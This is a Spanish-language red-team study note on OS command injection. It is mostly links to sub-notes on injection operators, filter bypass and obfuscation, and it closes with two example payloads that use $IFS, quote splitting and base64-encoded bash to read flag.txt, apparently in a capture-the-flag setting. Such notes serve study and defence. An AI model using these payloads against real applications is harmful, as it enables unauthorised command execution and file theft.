---
aliases:
tags:
  - type/cheatsheet
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: CheatSheet
linked:
  - "[[Command Injection - Operadores Generales]]"
  - "[[Command Injection - Bypass de Espacios]]"
  - "[[Command Injection - Generación de Caracteres Bloqueados]]"
  - "[[Command Injection - Operadores Especificos]]"
  - "[[Command Injection - Lista Negra de Comandos]]"
  - "[[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)]]"
  - "[[Command Injection - Herramientas de Obfuscación Automática]]"
  - "[[Command Injection - Prevención]]"
---
# OS Command Injection

***

## Cheatsheet

### Operadores

````tabs
tab: **Operadores Generales**
![[Command Injection - Operadores Generales#^ci-operadores-generales]]

tab: **Operadores Especificos**
![[Command Injection - Operadores Especificos#^ci-operadores-especificos]]
````

___

### Evasión de Filtros

````tabs
tab: **Espacios**
![[Command Injection - Bypass de Espacios#^ci-bypass-espacios]]

tab: **Caracteres Bloqueados**
![[Command Injection - Generación de Caracteres Bloqueados#^ci-caracteres-bloqueados]]

tab: **Lista Negra de Comandos**
![[Command Injection - Lista Negra de Comandos#^ci-blacklist-comandos]]
````

___

### Obfuscación

````tabs
tab: **Mayusculas**
![[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)#^ci-avanzado-mayusculas]]

tab: **Comandos Invertidos**
![[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)#^ci-avanzado-comandos-invertidos]]

tab: **Comandos Codificados**
![[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)#^ci-avanzado-comandos-codificados]]

````

***

## Overview


***

## Ejemplos 

```bash
$IFS%26c"a"t$IFS${PATH:0:1}flag.txt
```

```bash
$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
```